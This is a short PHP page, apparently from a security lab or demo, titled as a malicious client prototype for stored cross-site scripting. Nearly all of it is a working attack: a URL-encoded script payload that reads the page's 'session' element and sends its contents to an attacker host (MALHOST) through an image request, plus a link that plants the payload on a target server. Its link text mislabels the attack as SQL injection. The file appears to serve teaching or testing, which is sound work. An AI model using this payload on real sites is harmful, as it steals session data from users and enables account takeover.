<?php
include('../declare.php');

$value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALHOST."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Malicious client prototype: Stored XSS</title>
</head>
<body>
<h1>Stored XSS</h1>
Click here to simulate a malicious client with an SQL injection request:
<a href="<?=TGTHOST?>stored/target?value=<?=$value?>">attack</a>
<br/>
<br/>
<br/>
<a href="<?=TGTHOST?>stored/start">stored XSS start</a> |
<a href="<?=TGTHOST?>home">target server home</a>
</body>
</html>

